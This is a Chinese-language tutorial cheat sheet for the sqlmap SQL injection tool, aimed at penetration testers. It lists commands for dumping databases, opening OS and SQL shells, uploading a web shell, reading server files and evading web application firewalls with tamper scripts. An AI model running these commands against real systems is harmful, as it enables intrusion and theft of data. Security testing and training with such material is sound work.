   古语有云“工欲善其事，必先利其器”，给大家介绍一下数据库注入神器-SQLMAP，这款工具可以说是各位渗透测试工程师的安全工具包里必不可少的利器吧，其实日常测试中在注入工具这方面，我觉得一个SQLMAP就足以走天下了。

👇日常爆库操作走一波👇

1


查看用户

sqlmap -u <Target> --users

列出所有数据库

sqlmap -u <Target> --dbs

列出当期用户和数据库

sqlmap -u <Target> --current-user --current-db

列出表

sqlmap -u <Target> -D <库名> --tables

查看表的列

sqlmap -u <Target> -D <库名> -T <表名> --columns

查看列内容

sqlmap -u <Target> --dump -D <库名> -T <表名> -C <列1>,<列2> --dump

查看有多少条数据

sqlmap -u <Target>  -D <库名> -T <表名> --count

下载数据库

sqlmap -u <Target> --dump-all -D <库名>

⚠注意：日常项目渗透测试中，证实有注入即可，切勿违法脱库！谨记！

👇常用其他参数👇

2


指定风险risk

sqlmap -u <Target> --risk 3

--risk共有四个风险等级，默认是1

1 会测试大部分的测试语句

2 会增加基于事件的测试语句

3 会增加OR语句的SQL注入测试

在有些时候，例如在UPDATE的语句中，注入一个OR的测试语句，可能导致更新的整个表，可能造成很大的风险。

指定注入等级如最高等级5风险3

sqlmap -u <Target> --level 5 --risk 3

--level

--level2  适用cookie注入
--level3  适用http头注入（User-Agent/Referer）

指定线程（1~10）

sqlmap -u <Target> --threads 10

默认回车

sqlmap -u <Target> --batch

指定数据库注入（如mysql）

sqlmap -u <Target> --dbms mysql

直接执行sql语句

sqlmap -u <Target> --sql-shell

执行单条语句 

sqlmap -u <Target> --sql-query "select version()"

执行系统命令

sqlmap -u <Target> --os-shell

执行单条系统命令（如查看当前window系统绝对路径chdir）

sqlmap -u <Target> --os-cmd chdir

上传文件到服务器

sqlmap -u <Target> --file-write="c:\shell.php" --file-dest="/var/www/x.php"

延时盲注（指定注入类型为时间盲注，延时时间3秒）

sqlmap -u <Target> --technique T --time-sec 3

--technique（默认使用全部技术）

B,E,Q,U,S,T 直接决定注入类型的改变
B：布尔型盲注
E：报错型注入
Q：内联查询
U：联合查询
S：可多个语句查询的注入 对栈查询
T：基于时间的盲注

使用登录后的页面注入可利用cookie

sqlmap -u <Target> --cookie "sessionid=jfdifodsha"

post请求注入模式指定测试的参数

sqlmap -r Target.txt -p "id"

读取服务器文件

sqlmap -u <Target> --file-read "/var/www/x.php"

清缓存

sqlmap --purg

显示调试信息如显示注入payload

sqlmap -u <Target> -v3

-v

0   只显示python错误以及严重错误信息
1   同时显示基本信息和警告信息
2   同时显示debug信息
3   同时显示注入payload 
4   同时显示http请求
5   同时显示http响应头
6   同时显示http响应页面

👇绕WAF小技巧👇

3


设置时间间隔注入请求（单位：秒）

sqlmap -u <Target> --delay=0.5

修改user-Agent

sqlmap -u <Target> --random-agent

通过--random-agent，sqlmap将从./txt/user-agents中随机选择一个用于会话中的HTTP请求，一些站点在服务端检查HTTP User-Agent值，如果不是一个合法分值，就会中断连接。

SQLMAP自带绕WAF脚本

sqlmap -u <Target> --batch --tamper "space2morehash.py"

space2morehash.py脚本作用是把空格替换为#号以及更多随机字符串换行符。sqlmap可以联合使用多个tamper脚本。详细脚本分类说明推荐链接：https://blog.csdn.net/whatday/article/details/54774043
